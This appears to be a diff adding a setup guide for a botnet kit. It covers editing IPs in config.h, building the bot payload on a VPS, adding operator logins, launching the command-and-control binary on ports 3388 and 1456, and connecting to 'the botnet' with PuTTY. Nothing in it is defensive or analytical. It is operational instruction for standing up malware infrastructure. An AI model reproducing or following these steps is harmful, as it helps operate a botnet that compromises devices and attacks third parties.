@@ -1,0 +1,23 @@
+edit all ips in config.h
+
+drag all files into the vps
+
+run: chmod 777 build.sh
+
+run: ./build.sh install
+
+wait for it to finish, save the payload it gives you
+
+nano logins.txt
+add logins
+format: username password admin/user DD/MM/YYYY
+
+cd cnc
+mv cnc /lost+found
+cd
+rm -rf cnc
+mv /lost+found/cnc /root
+chmod 777 cnc
+screen ./cnc 3388 1456
+
+Connect to the botnet with PuTTY on port 1456
